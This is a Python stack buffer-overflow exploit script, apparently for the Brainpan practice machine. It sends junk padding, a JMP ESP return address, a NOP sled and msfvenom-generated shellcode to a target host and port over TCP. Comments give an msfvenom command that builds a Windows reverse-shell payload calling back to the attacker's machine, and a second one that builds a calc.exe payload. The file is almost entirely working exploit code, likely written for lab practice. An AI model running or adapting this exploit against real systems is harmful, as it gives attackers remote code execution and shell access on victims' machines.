#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# exp for brainpain

import sys
from time import sleep
import socket

# bsize = int(sys.argv[3])
# msfvenom -p windows/shell_reverse_tcp LHOST=[attack machine IP] LPORT=443 -f c -a x86 --platform windows -b "\x00\x0A\x0D" -e x86/shikata_ga_nai

# msfvenom -p windows/exec CMD=calc.exe -f python -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai -i 3

# block size 274
#

buf =  b""
buf += b"\xda\xc0\xbb\x79\x86\xac\x8c\xd9\x74\x24\xf4\x5d\x33"
buf += b"\xc9\xb1\x3e\x31\x5d\x1a\x03\x5d\x1a\x83\xed\xfc\xe2"
buf += b"\x8c\x5d\x63\x34\x33\x92\xd3\xac\x12\x26\x08\xdb\xff"
buf += b"\xec\x99\x92\xc7\xc3\x5a\xc2\xb4\xe7\x59\xef\xa4\x04"
buf += b"\x2c\xf3\xc0\xe0\x9f\xdd\x7f\x02\x26\xd1\x24\xc6\x2f"
buf += b"\x8c\x48\xfc\x97\xa0\x3b\xe6\x4c\xa0\xd1\xf3\xd4\xe7"
buf += b"\x6f\xb0\x40\x0a\x9d\x82\x2d\xec\x13\xb1\xfb\x08\xf0"
buf += b"\x4c\x3d\x21\x34\x0f\xc2\x8a\xd1\x33\x68\x2c\x76\x98"
buf += b"\xd9\xd1\x60\x33\x85\xf2\xa6\x6c\x70\x88\x62\xc3\x81"
buf += b"\x9a\x09\x09\xf5\xc4\x52\xc2\xf5\x98\x96\x83\xdb\x14"
buf += b"\xa0\xfc\x3d\x9e\x72\x05\xe1\x96\xbc\x18\x60\xc1\xe5"
buf += b"\xbc\x92\xe6\x6c\x29\x50\x58\x82\x36\xc8\x0e\x29\x98"
buf += b"\xb8\x07\xaa\xac\xb6\x13\x82\x62\x02\x50\x37\x22\xfa"
buf += b"\x84\xcc\xf2\x3f\x10\x84\x05\x43\x1f\x7d\xe0\x8a\x7f"
buf += b"\xf4\x69\xbd\xbb\xb5\xcd\x9e\x04\x6c\xbd\x55\x85\x85"
buf += b"\xf7\x22\x15\x21\x48\xe3\x4d\x17\xfd\x17\x26\x85\x9c"
buf += b"\x8c\x6b\xf4\x54\x06\xd6\xc2\xda\x48\xfb\x6f\xbc\xf4"
buf += b"\x0c\x47\xe2\x82\x3b\x08\x83\x86\x7a\xb3\x64\x70\x01"
buf += b"\x9d\x04\xc4\x65\xb0\x6a\xb5\x89\x5b\x60\xf4\xfc\xbc"
buf += b"\x15\x03\xe9\x5b\x05\x4e\x3d\x95\xef\x26\x7b\x78\x5a"
buf += b"\x5d\x94\xdd\x7d\xd7\xce\xff\x8f\x2f\xc0\x23\x6c\x7e"
buf += b"\x94"

def attack(dst, dst_port, data):
    try:
        socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socks.connect((dst, dst_port))
        conn = socks.recv(1024)
        # print(conn)

        dd = data
        socks.send(dd)
        print("Sending buffer: {}".format(dd))
        # print(conn)
    except socket.error as err:
        print("Socket connect failed! {}".format(err))
    finally:
        sleep(0.5)
        socks.close()

if __name__ == '__main__':

    # buffer create python -c 'print("A"*100)'
    # control esp

    junk = b"A"* 524 # ebp fill with 524 bytes 41414141
    # eip = 'B' * 4   # eip register will be fill with B 42424242
    # !mona find -s "\xff\xe4"
    # 311712f3
    eip = b"\xf3\x12\x17\x31"  
    # make to jmp esp to execute badchar 


    # block = "C" * (1000 - 524 - 4 - 405 - 20) # esp will be fill with C block 43434343
    nop = b"\x90" * 16
    buff = junk + eip + nop + buf

    host = str(sys.argv[1])
    port = int(sys.argv[2])

    attack(host, port, buff)
